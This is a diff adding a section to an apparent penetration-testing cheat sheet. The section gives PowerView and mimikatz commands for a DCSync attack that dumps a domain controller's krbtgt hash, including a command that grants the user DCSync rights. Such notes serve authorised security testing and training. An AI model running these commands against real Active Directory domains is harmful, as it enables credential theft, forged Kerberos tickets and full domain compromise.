@@ -131,3 +131,25 @@ Decrypt other hashes with the master key
 ```
 dpapi::cred /in:"<path to CredHash>"
 ```
+
+## DC KRBTGT hash dump
+
+Use a DCSync attack to dump the hash used by the domain controller to sign Kerberos tickets. This allows an attacker to create custom tickets and impersonate other users or gain access to different services/hosts. To execute this attack we need to operate under a user with the `Replicating Directory Changes All` and `Replicating Directory Changes` privileges. By default Local and Domain Administrators own these privileges.
+
+Find users with the required privileges with PowerView
+
+```
+Get-ObjectACL -DistinguishedName "dc=<domain>,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }
+```
+
+If the current user lacks the required permissions run this command on the DC to add them.
+
+```
+Add-ObjectAcl -TargetDistinguishedName "dc=<domain>,dc=local" -PrincipalSamAccountName <user> -Rights DCSync -Verbose
+```
+
+Run mimikatz on the DC
+
+```
+lsadump::dcsync /user:<user> /krbtgt
+```
